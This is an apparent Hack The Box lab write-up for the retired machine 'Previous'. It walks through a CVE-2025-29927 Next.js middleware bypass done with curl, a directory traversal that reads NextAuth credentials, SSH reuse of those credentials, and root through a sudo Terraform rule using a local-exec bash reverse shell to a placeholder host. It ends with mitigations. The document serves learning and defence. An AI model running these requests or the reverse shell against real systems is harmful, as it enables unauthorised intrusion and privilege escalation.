---
machine: Previous
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, nextjs, cve-2025-29927, auth-bypass, directory-traversal, terraform, privesc]
---

# Previous — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

`previous.htb` is a Next.js application documenting a fictional JavaScript framework. Middleware protects the authenticated area, but the version is vulnerable to CVE-2025-29927: an `x-middleware-subrequest` header makes Next.js skip the middleware. Inside the private area, `/api/download` takes a filename and allows a directory traversal that reads the NextAuth configuration, whose embedded credentials work for SSH as `jeremy`. For root, a `sudo` rule running Terraform is abused: a malicious config file with a `local-exec` plus variable overriding runs commands as root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 8.9p1 Ubuntu 3ubuntu0.13.
- `80` nginx 1.18.0 (Ubuntu).
- The site is served as `previous.htb`.

```bash
feroxbuster -u http://previous.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

`/docs`, `/login` and `/dashboard` appear; the dashboard redirects to login without a session.

## Enumeration

The site presents the framework and its examples. `/docs/examples` holds a download link:

```text
/api/download?example=hello-world.ts
```

The parameter is used as a file path. Adding `../` reads files outside the examples directory, including project files.

The server response includes the Next.js version header; the version is within the range affected by CVE-2025-29927.

## Foothold

CVE-2025-29927 skips the middleware that checks the session. The header is added to the request:

```bash
curl -s http://previous.htb/dashboard -H "x-middleware-subrequest: middleware"
```

The dashboard answers without a session cookie. From the authenticated area the traversal reads the NextAuth configuration files, which contain embedded credentials:

```bash
curl -s "http://previous.htb/api/download?example=../../../../<PATH>/<CONFIG>"
```

The credentials are tried over SSH and work for `jeremy`.

## Lateral movement

`jeremy` has no access to a second host. Their home holds configuration files and a working directory where Terraform runs. Enumeration focuses on `sudo`, file permissions and processes using those credentials.

## Privilege escalation

`sudo -l` shows `jeremy` may run Terraform as root, with a rule that keeps the working directory or environment variables. Terraform runs `local-exec` when applying a configuration; a custom `main.tf` can launch a command:

```hcl
resource "null_resource" "pwn" {
  provisioner "local-exec" {
    command = "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
  }
}
```

```bash
sudo terraform init
sudo terraform apply -auto-approve
```

The rule also allows overriding variables with `-var` or the environment, so a root file can be read or a key written. The resulting shell is root's.

## Evidence

- Vulnerable Next.js version and `/dashboard` reachable with the header.
- `/api/download` traversal reading the NextAuth config.
- Embedded credentials and SSH as `jeremy`.
- `sudo -l` with Terraform.
- `main.tf` with `local-exec` and a root shell.

## Lessons learned

- A middleware bypass invalidates every check that lives only there.
- An unnormalized download parameter is a file read.
- Credentials embedded in code reach production and get reused.
- `sudo` on a tool that executes configuration equals `sudo` on an interpreter.
- Terraform runs `local-exec` with the privileges it was started with.

## Mitigations and detection

- Update Next.js to a fixed release and enforce authorization in each route too.
- Reject external requests carrying `x-middleware-subrequest` at the proxy.
- Normalize and restrict download paths to a base directory.
- Move secrets out of code into a secret manager.
- Never grant `sudo` on Terraform, Ansible or similar config-executing tools; use an isolated runner.
- Alert on `terraform apply` with `local-exec` and on auth config reads.

## References

- [0xdf — Previous](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [IppSec — Previous](https://www.youtube.com/watch?v=WPUTGuitC_8)
- [Hack The Box — Previous](https://app.hackthebox.com/machines/previous)
- [NVD — CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
